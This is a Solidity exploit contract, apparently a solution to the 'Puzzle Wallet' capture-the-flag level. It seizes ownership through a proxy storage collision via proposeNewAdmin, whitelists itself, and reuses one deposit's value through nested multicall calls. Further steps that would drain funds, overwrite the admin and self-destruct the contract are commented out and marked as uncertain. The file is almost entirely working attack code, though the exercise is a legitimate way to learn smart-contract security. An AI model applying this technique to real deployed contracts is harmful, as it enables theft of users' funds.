// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./24-puzzlewallet.sol";

contract Attack24 {
    PuzzleWallet public target;
    PuzzleProxy public proxy;

    event AddedToWhiteList(address indexed _address);

    constructor(address payable _targetAddress) payable {
        target = PuzzleWallet(_targetAddress);        
        proxy = PuzzleProxy(_targetAddress);
    }

    function attack() public {
        proxy.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));

        // multicall
        // 1. deposit
        // 2. multicall
        //      - deposit

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(target.deposit.selector);
        
        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(target.multicall.selector, deposit_data);
        target.multicall{value: 0.001 ether}(data);

        // target.execute(msg.sender, 0.002 ether, "");
        
        // target.setMaxBalance(uint256(uint160(msg.sender)));

        // require(proxy.admin() == msg.sender, "the hack failed!!"); //  <-- not sure if this 
        // selfdestruct(payable(msg.sender));                         //  <-- will work
     }
}

